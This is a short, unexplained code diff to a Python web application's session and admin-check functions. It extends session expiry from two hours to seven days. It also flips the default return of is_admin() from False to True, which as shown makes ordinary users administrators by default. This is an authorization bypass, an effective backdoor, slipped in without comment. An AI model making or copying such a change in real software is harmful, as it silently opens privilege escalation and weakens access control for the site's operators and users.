@@ -201,7 +201,7 @@ def get_session_user(request):
 
 def create_session(user_id):
     token = secrets.token_hex(32)
-    expires = datetime.now() + timedelta(hours=2)
+    expires = datetime.now() + timedelta(days=7)
     sessions = load_json("sessions-data.json")
     sessions.setdefault("sessions", {})[token] = {
         "user_id": user_id,
@@ -538,7 +538,7 @@ def is_admin(user):
             return datetime.now() < datetime.fromisoformat(admin_until)
         except Exception:
             return False
-    return False
+    return True
 
 
 def is_muted(user):
